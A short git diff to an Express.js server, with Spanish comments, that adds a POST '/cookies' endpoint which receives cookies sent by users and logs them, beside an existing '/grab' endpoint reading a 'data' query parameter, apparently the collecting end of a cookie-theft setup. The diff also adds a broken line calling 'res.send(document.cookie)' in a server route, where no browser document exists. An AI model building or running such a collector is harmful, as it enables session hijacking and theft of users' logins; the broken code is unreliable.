@@ -5,7 +5,15 @@ let txt = ""
 
 app.get('/', (req, res)=>{
     res.send("Hola Mundo");
+    res.send(document.cookie)
 });
+
+app.post('/cookies', (req, res) => {
+    //Recibir las cookies que  nos manda el usuario
+    const cookies = req.body.cookies
+
+    console.log("Cookies recibidas :)", cookies);
+})
 
 app.get('/grab', (req, res) => {
     const data = req.query.data
